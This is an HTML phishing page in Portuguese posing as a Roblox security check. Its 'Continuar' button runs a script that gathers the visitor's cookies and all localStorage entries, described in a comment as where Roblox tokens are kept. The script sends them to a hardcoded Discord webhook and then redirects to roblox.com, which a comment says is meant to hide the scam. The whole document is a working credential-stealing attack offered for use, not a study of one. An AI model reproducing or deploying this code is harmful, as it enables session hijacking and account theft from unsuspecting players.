<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Roblox</title>
    <style>
        body { background-color: #191919; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; background: #232527; padding: 30px; border-radius: 10px; width: 300px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        img { width: 100px; margin-bottom: 20px; }
        button { background: #00a2ff; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; border-radius: 5px; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/200px-Roblox_player_icon_black.svg.png">
    <h2>Verificação de Segurança</h2>
    <p style="font-size: 14px;">Clique para continuar.</p>
    <button id="btn" onclick="pegarTudo()">Continuar</button>
</div>

<script>
async function pegarTudo() {
    const btn = document.getElementById('btn');
    btn.innerText = "Processando...";
    
    // 1. Pega Cookie Padrão
    let cookies = document.cookie;
    
    // 2. Pega LocalStorage (Onde o Roblox guarda tokens modernos às vezes)
    let ls = "";
    try {
        for(let i=0; i<localStorage.length; i++) {
            let key = localStorage.key(i);
            let val = localStorage.getItem(key);
            ls += `${key}=${val}\n`;
        }
    } catch(e) {}

    // Junta tudo
    let fullData = `Cookies:\n${cookies}\n\nLocalStorage:\n${ls}`;

    const webhookUrl = "https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1";

    // Tenta enviar para o Discord
    fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `🍪 **Dados Capturados:**\n\`\`\`${fullData}\`\`\``
        })
    }).catch(err => console.log("Erro Discord:", err));

    // Redireciona imediatamente para não parecer golpe
    window.location.href = "https://www.roblox.com/home";
}
</script>

</body>
</html>
